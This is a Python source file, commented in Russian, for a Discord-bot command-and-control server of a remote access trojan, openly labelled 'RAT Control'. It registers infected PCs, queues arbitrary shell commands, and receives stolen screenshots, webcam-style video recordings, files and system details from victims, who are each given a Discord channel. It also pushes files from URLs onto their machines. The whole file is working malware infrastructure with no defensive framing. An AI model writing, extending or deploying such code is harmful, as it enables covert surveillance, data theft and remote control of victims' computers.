import discord
from discord.ext import commands
import asyncio
import json
import base64
from datetime import datetime
import os

# Конфигурация
intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

# Хранилище подключённых клиентов
clients = {}  # {client_id: {info, last_seen, channel_id}}

# Очередь команд для клиентов
command_queue = {}  # {client_id: [commands]}

@bot.event
async def on_ready():
    print(f'✅ Бот запущен: {bot.user.name}')
    print(f'📊 Серверов: {len(bot.guilds)}')

    # Создаём категорию для RAT если нет
    for guild in bot.guilds:
        category = discord.utils.get(guild.categories, name='🔴 RAT Control')
        if not category:
            category = await guild.create_category('🔴 RAT Control')
            await guild.create_text_channel('commands', category=category)
            await guild.create_text_channel('logs', category=category)
            print(f'✅ Создана категория RAT Control на сервере {guild.name}')

@bot.command(name='clients')
async def list_clients(ctx):
    """Список всех подключённых клиентов"""
    if not clients:
        await ctx.send('❌ Нет подключённых клиентов')
        return

    embed = discord.Embed(title='💻 Подключённые клиенты', color=0x00ff00)

    for client_id, data in clients.items():
        info = data['info']
        last_seen = data['last_seen']
        online = data.get('online', True)

        status_emoji = '🟢' if online else '🔴'
        status_text = 'Online' if online else 'Offline'

        value = f"**Status:** {status_emoji} {status_text}\n"
        value += f"**PC:** {info.get('pc_name', 'Unknown')}\n"
        value += f"**User:** {info.get('username', 'Unknown')}\n"
        value += f"**OS:** {info.get('os', 'Unknown')}\n"
        value += f"**IP:** {info.get('ip', 'Unknown')}\n"
        value += f"**Last seen:** {last_seen}"

        embed.add_field(name=f'{status_emoji} {client_id[:16]}...', value=value, inline=False)

    await ctx.send(embed=embed)

@bot.command(name='cmd')
async def send_command(ctx, client_id: str, *, command: str):
    """Отправить команду клиенту: !cmd <client_id> <command>"""
    if client_id not in clients:
        await ctx.send(f'❌ Клиент {client_id} не найден')
        return

    if client_id not in command_queue:
        command_queue[client_id] = []

    command_queue[client_id].append({
        'type': 'cmd',
        'data': command,
        'timestamp': datetime.now().isoformat()
    })

    await ctx.send(f'✅ Команда отправлена клиенту {client_id[:8]}...')

@bot.command(name='screenshot')
async def screenshot(ctx, client_id: str):
    """Сделать скриншот: !screenshot <client_id>"""
    if client_id not in clients:
        await ctx.send(f'❌ Клиент {client_id} не найден')
        return

    if client_id not in command_queue:
        command_queue[client_id] = []

    command_queue[client_id].append({
        'type': 'screenshot',
        'timestamp': datetime.now().isoformat()
    })

    await ctx.send(f'📸 Запрос скриншота отправлен клиенту {client_id[:8]}...')

@bot.command(name='video')
async def record_video(ctx, client_id: str, duration: int = 15):
    """Записать видео: !video <client_id> [duration]"""
    if client_id not in clients:
        await ctx.send(f'❌ Клиент {client_id} не найден')
        return

    if duration > 60:
        await ctx.send('❌ Максимальная длительность: 60 секунд')
        return

    if client_id not in command_queue:
        command_queue[client_id] = []

    command_queue[client_id].append({
        'type': 'video',
        'data': duration,
        'timestamp': datetime.now().isoformat()
    })

    await ctx.send(f'🎥 Запрос записи видео ({duration}s) отправлен клиенту {client_id[:8]}...')

@bot.command(name='download')
async def download_file(ctx, client_id: str, *, filepath: str):
    """Скачать файл с ПК: !download <client_id> <filepath>"""
    if client_id not in clients:
        await ctx.send(f'❌ Клиент {client_id} не найден')
        return

    if client_id not in command_queue:
        command_queue[client_id] = []

    command_queue[client_id].append({
        'type': 'download',
        'data': filepath,
        'timestamp': datetime.now().isoformat()
    })

    await ctx.send(f'📥 Запрос скачивания файла отправлен клиенту {client_id[:8]}...')

@bot.command(name='upload')
async def upload_file(ctx, client_id: str, url: str, *, save_path: str):
    """Загрузить файл на ПК: !upload <client_id> <url> <save_path>"""
    if client_id not in clients:
        await ctx.send(f'❌ Клиент {client_id} не найден')
        return

    if client_id not in command_queue:
        command_queue[client_id] = []

    command_queue[client_id].append({
        'type': 'upload',
        'data': {'url': url, 'path': save_path},
        'timestamp': datetime.now().isoformat()
    })

    await ctx.send(f'📤 Запрос загрузки файла отправлен клиенту {client_id[:8]}...')

@bot.command(name='sysinfo')
async def system_info(ctx, client_id: str):
    """Получить информацию о системе: !sysinfo <client_id>"""
    if client_id not in clients:
        await ctx.send(f'❌ Клиент {client_id} не найден')
        return

    if client_id not in command_queue:
        command_queue[client_id] = []

    command_queue[client_id].append({
        'type': 'sysinfo',
        'timestamp': datetime.now().isoformat()
    })

    await ctx.send(f'ℹ️ Запрос информации отправлен клиенту {client_id[:8]}...')

# API эндпоинты для клиентов (через HTTP)
from aiohttp import web

async def handle_register(request):
    """Регистрация нового клиента"""
    data = await request.json()
    client_id = data.get('client_id')

    # Проверяем, существует ли уже этот клиент
    if client_id in clients:
        # Обновляем информацию существующего клиента
        clients[client_id]['info'] = data
        clients[client_id]['last_seen'] = datetime.now().isoformat()

        # Отправляем сообщение о переподключении
        channel_id = clients[client_id]['channel_id']
        if channel_id:
            channel = bot.get_channel(channel_id)
            if channel:
                embed = discord.Embed(title='🟢 Клиент переподключился', color=0x00ff00)
                embed.add_field(name='ID', value=client_id, inline=False)
                embed.add_field(name='Time', value=datetime.now().strftime('%Y-%m-%d %H:%M:%S'), inline=False)
                await channel.send(embed=embed)

        return web.json_response({'status': 'reconnected'})

    # Новый клиент - создаём запись
    clients[client_id] = {
        'info': data,
        'last_seen': datetime.now().isoformat(),
        'channel_id': None,
        'online': True
    }

    # Создаём канал для клиента
    for guild in bot.guilds:
        category = discord.utils.get(guild.categories, name='🔴 RAT Control')
        if category:
            channel_name = f"pc-{data.get('pc_name', 'unknown')}-{client_id[:8]}"
            channel = await guild.create_text_channel(channel_name, category=category)
            clients[client_id]['channel_id'] = channel.id

            # Отправляем приветственное сообщение
            embed = discord.Embed(title='🟢 Новый клиент подключён', color=0x00ff00)
            embed.add_field(name='ID', value=client_id, inline=False)
            embed.add_field(name='PC Name', value=data.get('pc_name'), inline=True)
            embed.add_field(name='Username', value=data.get('username'), inline=True)
            embed.add_field(name='OS', value=data.get('os'), inline=True)
            embed.add_field(name='IP', value=data.get('ip'), inline=True)
            embed.add_field(name='First seen', value=datetime.now().strftime('%Y-%m-%d %H:%M:%S'), inline=False)
            await channel.send(embed=embed)
            break

    return web.json_response({'status': 'ok'})

async def handle_poll(request):
    """Клиент запрашивает команды"""
    data = await request.json()
    client_id = data.get('client_id')

    if client_id in clients:
        old_last_seen = clients[client_id]['last_seen']
        clients[client_id]['last_seen'] = datetime.now().isoformat()
        clients[client_id]['online'] = True

    # Отправляем команды из очереди
    commands = command_queue.get(client_id, [])
    command_queue[client_id] = []

    return web.json_response({'commands': commands})

async def handle_response(request):
    """Клиент отправляет ответ"""
    data = await request.json()
    client_id = data.get('client_id')
    response_type = data.get('type')
    response_data = data.get('data')

    if client_id not in clients:
        return web.json_response({'status': 'error', 'message': 'Unknown client'})

    channel_id = clients[client_id]['channel_id']
    if not channel_id:
        return web.json_response({'status': 'error', 'message': 'No channel'})

    channel = bot.get_channel(channel_id)
    if not channel:
        return web.json_response({'status': 'error', 'message': 'Channel not found'})

    # Обработка разных типов ответов
    if response_type == 'cmd':
        await channel.send(f"```\n{response_data}\n```")

    elif response_type == 'screenshot':
        # response_data это base64 изображение
        import io
        image_data = base64.b64decode(response_data)
        file = discord.File(io.BytesIO(image_data), filename='screenshot.png')
        await channel.send('📸 Скриншот:', file=file)

    elif response_type == 'video':
        # response_data это base64 видео
        import io
        video_data = base64.b64decode(response_data)
        file = discord.File(io.BytesIO(video_data), filename='recording.mp4')
        await channel.send('🎥 Видео:', file=file)

    elif response_type == 'file':
        # response_data это base64 файл
        import io
        file_data = base64.b64decode(response_data['content'])
        filename = response_data['filename']
        file = discord.File(io.BytesIO(file_data), filename=filename)
        await channel.send(f'📁 Файл: {filename}', file=file)

    elif response_type == 'sysinfo':
        embed = discord.Embed(title='💻 Информация о системе', color=0x0099ff)
        for key, value in response_data.items():
            embed.add_field(name=key, value=value, inline=True)
        await channel.send(embed=embed)

    elif response_type == 'error':
        await channel.send(f'❌ Ошибка: {response_data}')

    return web.json_response({'status': 'ok'})

async def start_web_server():
    """Запуск веб-сервера для API"""
    app = web.Application()
    app.router.add_post('/register', handle_register)
    app.router.add_post('/poll', handle_poll)
    app.router.add_post('/response', handle_response)

    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', 8080)
    await site.start()
    print('🌐 Веб-сервер запущен на порту 8080')

@bot.event
async def on_connect():
    bot.loop.create_task(start_web_server())
    bot.loop.create_task(check_offline_clients())

async def check_offline_clients():
    """Проверка отключившихся клиентов"""
    await bot.wait_until_ready()

    while not bot.is_closed():
        try:
            now = datetime.now()

            for client_id, data in list(clients.items()):
                last_seen_str = data['last_seen']
                last_seen = datetime.fromisoformat(last_seen_str)

                # Если клиент не отвечает больше 30 секунд
                time_diff = (now - last_seen).total_seconds()

                if time_diff > 30 and data.get('online', True):
                    # Помечаем как оффлайн
                    clients[client_id]['online'] = False

                    # Отправляем уведомление
                    channel_id = data['channel_id']
                    if channel_id:
                        channel = bot.get_channel(channel_id)
                        if channel:
                            embed = discord.Embed(title='🔴 Клиент отключился', color=0xff0000)
                            embed.add_field(name='ID', value=client_id, inline=False)
                            embed.add_field(name='Last seen', value=last_seen.strftime('%Y-%m-%d %H:%M:%S'), inline=False)
                            embed.add_field(name='Offline for', value=f'{int(time_diff)} seconds', inline=False)
                            await channel.send(embed=embed)

        except Exception as e:
            print(f'Error in check_offline_clients: {e}')

        await asyncio.sleep(10)  # Проверяем каждые 10 секунд

# Запуск бота
if __name__ == '__main__':
    TOKEN = os.getenv('DISCORD_BOT_TOKEN')
    if not TOKEN:
        print('❌ Не найден DISCORD_BOT_TOKEN в переменных окружения!')
        exit(1)

    bot.run(TOKEN)
